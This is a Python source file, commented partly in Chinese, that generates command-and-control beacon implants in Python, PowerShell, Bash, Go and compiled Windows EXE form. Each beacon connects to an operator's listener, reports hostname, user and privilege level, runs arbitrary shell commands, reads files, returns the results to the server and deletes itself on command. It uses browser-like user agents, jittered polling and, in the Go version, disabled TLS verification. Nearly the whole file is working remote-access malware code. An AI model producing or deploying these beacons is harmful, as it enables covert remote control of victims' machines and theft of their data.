"""Multi-platform beacon generator for C2 listeners.

Generates beacon scripts (Python / PowerShell / Bash) that connect back
to a configured C2 listener using the specified protocol.
"""

from __future__ import annotations

import hashlib
import os
import secrets
from dataclasses import dataclass
from pathlib import Path

# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class BeaconSpec:
    """Result of beacon generation."""
    filename: str
    content: str
    mime_type: str = "text/plain"
    is_binary: bool = False
    platform: str = ""       # windows / linux / macos / android
    arch: str = ""           # x64 / x86 / arm64 / arm
    payload_type: str = ""   # python / powershell / bash / go / exe
    protocol: str = ""       # http / tcp / udp / icmp / dns
    description: str = ""


# ---------------------------------------------------------------------------
# Supported targets
# ---------------------------------------------------------------------------

PLATFORMS = {
    "windows": {"label": "Windows", "archs": ["x64", "x86", "arm64"]},
    "linux":   {"label": "Linux",   "archs": ["x64", "x86", "arm64", "arm"]},
    "macos":   {"label": "macOS",   "archs": ["x64", "arm64"]},
    "android": {"label": "Android", "archs": ["arm64", "arm", "x86"]},
}

PAYLOAD_TYPES = {
    "python":     {"label": "Python 脚本",   "platforms": ["windows", "linux", "macos", "android"], "ext": ".py"},
    "powershell": {"label": "PowerShell",    "platforms": ["windows"],                              "ext": ".ps1"},
    "bash":       {"label": "Bash 脚本",     "platforms": ["linux", "macos", "android"],            "ext": ".sh"},
    "go":         {"label": "Go 源码 (需编译)", "platforms": ["windows", "linux", "macos", "android"], "ext": ".go"},
    "exe":        {"label": "EXE 可执行文件",  "platforms": ["windows"],                              "ext": ".exe"},
}

PROTOCOLS = {
    "http":  {"label": "HTTP",  "description": "HTTP 轮询回连（默认）"},
    "https": {"label": "HTTPS", "description": "HTTPS 加密回连"},
    "tcp":   {"label": "TCP",   "description": "原生 TCP 长连接"},
    "udp":   {"label": "UDP",   "description": "UDP 数据报通信"},
    "icmp":  {"label": "ICMP",  "description": "ICMP 隧道通信"},
    "dns":   {"label": "DNS",   "description": "DNS 查询隧道"},
}


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------

def generate_beacon(
    *,
    listener_host: str,
    listener_port: int,
    protocol: str = "http",
    platform: str = "linux",
    arch: str = "x64",
    payload_type: str = "python",
    poll_interval: int = 5,
    agent_id: str = "",
    extra_config: dict | None = None,
) -> BeaconSpec:
    """Generate a beacon script for the given parameters."""
    if not agent_id:
        agent_id = hashlib.sha256(
            f"{platform}-{arch}-{secrets.token_hex(8)}".encode()
        ).hexdigest()[:24]

    builders = {
        "python":     _build_python,
        "powershell": _build_powershell,
        "bash":       _build_bash,
        "go":         _build_go,
        "exe":        _build_exe,
    }
    builder = builders.get(payload_type)
    if not builder:
        raise ValueError(f"不支持的 payload 类型: {payload_type}")

    return builder(
        listener_host=listener_host,
        listener_port=listener_port,
        protocol=protocol,
        platform=platform,
        arch=arch,
        poll_interval=poll_interval,
        agent_id=agent_id,
        extra_config=extra_config or {},
    )


def _fmt(template: str, **kwargs) -> str:
    """Safe template substitution — avoids conflicts with literal { } in code."""
    result = template
    for k, v in kwargs.items():
        result = result.replace("{" + k + "}", str(v))
    return result


# ---------------------------------------------------------------------------
# Python beacon (cross-platform, uses existing agent template logic)
# ---------------------------------------------------------------------------

def _build_python(*, listener_host, listener_port, protocol, platform, arch,
                   poll_interval, agent_id, extra_config) -> BeaconSpec:
    proto_prefix = "https" if protocol == "https" else "http"
    server_url = f"{proto_prefix}://{listener_host}:{listener_port}"
    transport_note = ""
    if protocol in ("tcp", "udp", "icmp", "dns"):
        transport_note = f"# Transport: {protocol.upper()} tunnel → {listener_host}:{listener_port}"
        server_url = f"http://{listener_host}:{listener_port}"

    content = _fmt(_PYTHON_TEMPLATE,
        server_url=server_url, agent_id=agent_id, poll_interval=poll_interval,
        max_poll_interval=min(poll_interval * 60, 300), transport_note=transport_note,
    )
    return BeaconSpec(
        filename=f"beacon_{platform}_{arch}_{agent_id[:8]}.py", content=content,
        platform=platform, arch=arch, payload_type="python", protocol=protocol,
        description=f"Python beacon for {platform}/{arch} via {protocol.upper()}",
    )


# ---------------------------------------------------------------------------
# PowerShell beacon (Windows)
# ---------------------------------------------------------------------------

def _build_powershell(*, listener_host, listener_port, protocol, platform, arch,
                       poll_interval, agent_id, extra_config) -> BeaconSpec:
    content = _fmt(_POWERSHELL_TEMPLATE,
        server_host=listener_host, server_port=listener_port, agent_id=agent_id,
        poll_interval=poll_interval, protocol="https" if protocol == "https" else "http",
    )
    return BeaconSpec(
        filename=f"beacon_win_{arch}_{agent_id[:8]}.ps1", content=content,
        platform="windows", arch=arch, payload_type="powershell", protocol=protocol,
        description=f"PowerShell beacon for Windows/{arch} via {protocol.upper()}",
    )


# ---------------------------------------------------------------------------
# Bash beacon (Linux / macOS / Android)
# ---------------------------------------------------------------------------

def _build_bash(*, listener_host, listener_port, protocol, platform, arch,
                 poll_interval, agent_id, extra_config) -> BeaconSpec:
    content = _fmt(_BASH_TEMPLATE,
        server_host=listener_host, server_port=listener_port, agent_id=agent_id,
        poll_interval=poll_interval, protocol="https" if protocol == "https" else "http",
    )
    return BeaconSpec(
        filename=f"beacon_{platform}_{arch}_{agent_id[:8]}.sh", content=content,
        platform=platform, arch=arch, payload_type="bash", protocol=protocol,
        description=f"Bash beacon for {platform}/{arch} via {protocol.upper()}",
    )


# ---------------------------------------------------------------------------
# Go source beacon (user compiles locally)
# ---------------------------------------------------------------------------

def _build_go(*, listener_host, listener_port, protocol, platform, arch,
               poll_interval, agent_id, extra_config) -> BeaconSpec:
    content = _fmt(_GO_TEMPLATE,
        server_host=listener_host, server_port=listener_port, agent_id=agent_id,
        poll_interval=poll_interval, protocol="https" if protocol == "https" else "http",
    )
    goos = "darwin" if platform == "macos" else platform
    goarch = "amd64" if arch == "x64" else ("386" if arch == "x86" else arch)
    compile_hint = (
        f"# 编译命令:\n"
        f"# GOOS={goos} GOARCH={goarch} go build -ldflags='-s -w' -o beacon_{platform}_{arch} beacon.go\n"
    )
    return BeaconSpec(
        filename=f"beacon_{platform}_{arch}_{agent_id[:8]}.go", content=compile_hint + "\n" + content,
        platform=platform, arch=arch, payload_type="go", protocol=protocol,
        description=f"Go source for {platform}/{arch} via {protocol.upper()} (需本地编译)",
    )


def _build_exe(*, listener_host, listener_port, protocol, platform, arch,
                poll_interval, agent_id, extra_config) -> BeaconSpec:
    """Compile a Go beacon into a Windows .exe using cross-compilation."""
    import subprocess as _sp
    import tempfile

    goarch = "amd64" if arch == "x64" else ("386" if arch == "x86" else arch)
    source = _fmt(_GO_TEMPLATE,
        server_host=listener_host, server_port=listener_port, agent_id=agent_id,
        poll_interval=poll_interval, protocol="https" if protocol == "https" else "http",
    )

    with tempfile.TemporaryDirectory() as tmpdir:
        src_path = Path(tmpdir) / "beacon.go"
        src_path.write_text(source, encoding="utf-8")
        out_path = Path(tmpdir) / "beacon.exe"

        env = os.environ.copy()
        env.update({"CGO_ENABLED": "0", "GOOS": "windows", "GOARCH": goarch})

        result = _sp.run(
            ["go", "build", "-ldflags", "-s -w", "-o", str(out_path), str(src_path)],
            capture_output=True, text=True, timeout=60, env=env, cwd=tmpdir,
        )

        if result.returncode != 0:
            raise RuntimeError(f"go build failed: {result.stderr[:500]}")

        if not out_path.exists():
            raise RuntimeError("go build produced no output")

        binary = out_path.read_bytes()

    return BeaconSpec(
        filename=f"beacon_win_{arch}_{agent_id[:8]}.exe",
        content=binary,
        mime_type="application/octet-stream",
        is_binary=True,
        platform="windows",
        arch=arch,
        payload_type="exe",
        protocol=protocol,
        description=f"Windows EXE beacon ({arch}) via {protocol.upper()}",
    )


# ===========================================================================
# TEMPLATES
# ===========================================================================

_PYTHON_TEMPLATE = r'''#!/usr/bin/env python3
"""AgentCapture C2 Beacon — auto-generated"""
{transport_note}
import json, os, platform, socket, subprocess, sys, time, random
from pathlib import Path
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError

_SERVER   = "{server_url}"
_AGENT_ID = "{agent_id}"
_INTERVAL = {poll_interval}
_MAX_INT  = {max_poll_interval}
_UA       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

def _post(endpoint, data):
    body = json.dumps(data).encode()
    req = Request(_SERVER + endpoint, data=body,
                  headers={"Content-Type": "application/json", "User-Agent": _UA})
    resp = urlopen(req, timeout=15)
    return json.loads(resp.read())

def _collect():
    uname = platform.uname()
    try:
        user = os.getlogin()
    except Exception:
        user = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))
    priv = "root" if hasattr(os, "geteuid") and os.geteuid() == 0 else "user"
    return {
        "hostname": uname.node, "os_name": uname.system, "os_version": uname.version,
        "username": user, "arch": uname.machine, "privileges": priv,
    }

def _exec(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        return r.stdout[:65536] + r.stderr[:65536]
    except Exception as e:
        return "ERROR: " + str(e)

def _run():
    info = _collect()
    try:
        resp = _post("/c2/heartbeat", {"agent_id": _AGENT_ID, "source_ip": "auto",
                    "payload_type": "python", **info, "results": []})
        aid = resp.get("agent_id", _AGENT_ID)
        interval = resp.get("poll_interval", _INTERVAL)
    except Exception:
        aid, interval = _AGENT_ID, _INTERVAL

    backoff = interval
    while True:
        try:
            task = _post("/c2/tasks/poll", {"agent_id": aid})
            backoff = interval
        except Exception:
            time.sleep(backoff)
            backoff = min(backoff * 2, _MAX_INT)
            continue

        if not task or not task.get("task_id"):
            try:
                _post("/c2/heartbeat", {"agent_id": aid, "source_ip": "auto",
                       "payload_type": "python", **_collect(), "results": []})
            except Exception:
                pass
            time.sleep(interval * (0.8 + random.random() * 0.4))
            continue

        tid, ttype = task["task_id"], task.get("task_type", "cmd")
        if ttype == "cmd":
            out = _exec(task.get("command", "id"))
        elif ttype == "read_file":
            try:
                out = Path(task.get("command", "")).read_text()[:1048576]
            except Exception as e:
                out = "ERROR: " + str(e)
        elif ttype == "uninstall":
            _post("/c2/tasks/" + str(tid) + "/result", {"agent_id": aid, "status": "completed", "output": "uninstalled"})
            try:
                Path(__file__).unlink(missing_ok=True)
            except Exception:
                pass
            sys.exit(0)
        else:
            out = "Unknown task type: " + str(ttype)

        try:
            _post("/c2/tasks/" + str(tid) + "/result", {"agent_id": aid, "status": "completed", "output": out})
        except Exception:
            pass

        time.sleep(interval * (0.8 + random.random() * 0.4))

if __name__ == "__main__":
    _run()
'''

_POWERSHELL_TEMPLATE = r'''# AgentCapture C2 Beacon - PowerShell
# Agent ID: {agent_id}

$Server = "{protocol}://{server_host}:{server_port}"
$AgentId = "{agent_id}"
$Interval = {poll_interval}
$UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

function Invoke-C2Post($Endpoint, $Data) {
    $json = $Data | ConvertTo-Json -Depth 5
    try {
        $r = Invoke-RestMethod -Uri "$Server$Endpoint" -Method Post -Body $json `
            -ContentType "application/json" -UserAgent $UA -TimeoutSec 15
        return $r
    } catch { return $null }
}

function Get-SystemInfo {
    $h = $env:COMPUTERNAME; $u = $env:USERNAME
    $os = (Get-CimInstance Win32_OperatingSystem).Caption
    $arch = if ([Environment]::Is64BitOperatingSystem) {"x64"} else {"x86"}
    $priv = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {"root"} else {"user"}
    return @{hostname=$h; os_name="Windows"; os_version=$os; username=$u; arch=$arch; privileges=$priv}
}

function Invoke-ShellCmd($Cmd) {
    try { $o = Invoke-Expression $Cmd 2>&1 | Out-String; return $o.Substring(0, [Math]::Min($o.Length, 65536)) }
    catch { return "ERROR: $_" }
}

$info = Get-SystemInfo
$resp = Invoke-C2Post "/c2/heartbeat" @{agent_id=$AgentId; source_ip="auto"; payload_type="powershell"; results=@(); hostname=$info.hostname; os_name=$info.os_name; os_version=$info.os_version; username=$info.username; arch=$info.arch; privileges=$info.privileges}
if ($resp.agent_id) { $AgentId = $resp.agent_id }

while ($true) {
    try {
        $task = Invoke-C2Post "/c2/tasks/poll" @{agent_id=$AgentId}
    } catch { Start-Sleep -Seconds $Interval; continue }

    if ($task -and $task.task_id) {
        $out = ""
        switch ($task.task_type) {
            "cmd"        { $out = Invoke-ShellCmd $task.command }
            "read_file"  { try { $out = Get-Content $task.command -Raw -ErrorAction Stop } catch { $out = "ERROR: $_" } }
            "uninstall"  {
                Invoke-C2Post "/c2/tasks/$($task.task_id)/result" @{agent_id=$AgentId; status="completed"; output="uninstalled"}
                Remove-Item -Path $MyInvocation.ScriptName -Force -ErrorAction SilentlyContinue
                exit
            }
            default      { $out = "Unknown: $($task.task_type)" }
        }
        Invoke-C2Post "/c2/tasks/$($task.task_id)/result" @{agent_id=$AgentId; status="completed"; output=$out}
    } else {
        $info = Get-SystemInfo
        Invoke-C2Post "/c2/heartbeat" @{agent_id=$AgentId; source_ip="auto"; payload_type="powershell"; results=@(); hostname=$info.hostname; os_name=$info.os_name; os_version=$info.os_version; username=$info.username; arch=$info.arch; privileges=$info.privileges}
    }
    Start-Sleep -Seconds ($Interval + (Get-Random -Minimum -1 -Maximum 2))
}
'''

_BASH_TEMPLATE = r'''#!/usr/bin/env bash
# AgentCapture C2 Beacon - Bash
# Agent ID: {agent_id}

SERVER="{protocol}://{server_host}:{server_port}"
AGENT_ID="{agent_id}"
INTERVAL={poll_interval}
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"

post() {
    curl -s -X POST "$SERVER$1" -H "Content-Type: application/json" \
        -H "User-Agent: $UA" -d "$2" --connect-timeout 10 --max-time 15 2>/dev/null
}

collect() {
    H=$(hostname 2>/dev/null || echo "unknown")
    O=$(uname -s)
    V=$(uname -r)
    U=$(whoami 2>/dev/null || id -un 2>/dev/null || echo "unknown")
    A=$(uname -m)
    P="user"; [ "$(id -u)" = "0" ] && P="root"
    echo "\"hostname\":\"$H\",\"os_name\":\"$O\",\"os_version\":\"$V\",\"username\":\"$U\",\"arch\":\"$A\",\"privileges\":\"$P\""
}

exec_cmd() {
    R=$(eval "$1" 2>&1 | head -c 65536)
    echo "$R"
}

INFO=$(collect)
RESP=$(post "/c2/heartbeat" "{\"agent_id\":\"$AGENT_ID\",\"source_ip\":\"auto\",\"payload_type\":\"bash\",\"results\":[]}")
AID=$(echo "$RESP" | grep -o '"agent_id":"[^"]*"' | head -1 | cut -d'"' -f4)
[ -n "$AID" ] && AGENT_ID="$AID"

while true; do
    TASK=$(post "/c2/tasks/poll" "{\"agent_id\":\"$AGENT_ID\"}")
    TID=$(echo "$TASK" | grep -o '"task_id":[0-9]*' | head -1 | grep -o '[0-9]*')
    TTYPE=$(echo "$TASK" | grep -o '"task_type":"[^"]*"' | head -1 | cut -d'"' -f4)
    CMD=$(echo "$TASK" | grep -o '"command":"[^"]*"' | head -1 | cut -d'"' -f4)

    if [ -n "$TID" ]; then
        case "$TTYPE" in
            cmd)        OUT=$(exec_cmd "$CMD") ;;
            read_file)  OUT=$(cat "$CMD" 2>&1 | head -c 1048576) ;;
            uninstall)  post "/c2/tasks/$TID/result" "{\"agent_id\":\"$AGENT_ID\",\"status\":\"completed\",\"output\":\"uninstalled\"}"
                        rm -f "$0"; exit 0 ;;
            *)          OUT="Unknown: $TTYPE" ;;
        esac
        post "/c2/tasks/$TID/result" "{\"agent_id\":\"$AGENT_ID\",\"status\":\"completed\",\"output\":\"$(echo "$OUT" | head -c 65536)\"}"
    else
        INFO=$(collect)
        post "/c2/heartbeat" "{\"agent_id\":\"$AGENT_ID\",\"source_ip\":\"auto\",\"payload_type\":\"bash\",\"results\":[]}"
    fi
    sleep $((INTERVAL + RANDOM % 3))
done
'''

_GO_TEMPLATE = r'''package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"time"
)

var (
	serverURL = "{protocol}://{server_host}:{server_port}"
	agentID   = "{agent_id}"
	interval  = {poll_interval}
)

func post(endpoint string, data interface{}) (map[string]interface{}, error) {
	body, _ := json.Marshal(data)
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
	req, _ := http.NewRequest("POST", serverURL+endpoint, bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	resp, err := client.Do(req)
	if err != nil { return nil, err }
	defer resp.Body.Close()
	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)
	return result, nil
}

func collect() (string, string, string, string, string) {
	h, _ := os.Hostname()
	u, _ := user.Current()
	uname := "unknown"
	if u != nil { uname = u.Username }
	priv := "user"
	if os.Geteuid() == 0 { priv = "root" }
	return h, runtime.GOOS, uname, runtime.GOARCH, priv
}

func execCmd(cmd string) string {
	var c *exec.Cmd
	if runtime.GOOS == "windows" { c = exec.Command("cmd", "/C", cmd) } else { c = exec.Command("bash", "-c", cmd) }
	out, _ := c.CombinedOutput()
	if len(out) > 65536 { out = out[:65536] }
	return string(out)
}

func main() {
	h, osName, uname, arch, priv := collect()
	post("/c2/heartbeat", map[string]interface{}{
		"agent_id": agentID, "source_ip": "auto", "payload_type": "go",
		"hostname": h, "os_name": osName, "os_version": arch,
		"username": uname, "arch": arch, "privileges": priv, "results": []interface{}{},
	})

	for {
		task, err := post("/c2/tasks/poll", map[string]string{"agent_id": agentID})
		if err != nil || task == nil {
			time.Sleep(time.Duration(interval) * time.Second)
			continue
		}
		tid, _ := task["task_id"].(float64)
		ttype, _ := task["task_type"].(string)
		cmd, _ := task["command"].(string)
		out := ""
		switch ttype {
		case "cmd": out = execCmd(cmd)
		case "uninstall":
			post(fmt.Sprintf("/c2/tasks/%v/result", tid), map[string]string{"agent_id": agentID, "status": "completed", "output": "uninstalled"})
			os.Remove(os.Args[0])
			return
		default: out = "Unknown: " + ttype
		}
		post(fmt.Sprintf("/c2/tasks/%v/result", tid), map[string]string{"agent_id": agentID, "status": "completed", "output": out})
		jitter := time.Duration(rand.Intn(3)) * time.Second
		time.Sleep(time.Duration(interval)*time.Second + jitter)
	}
}
'''
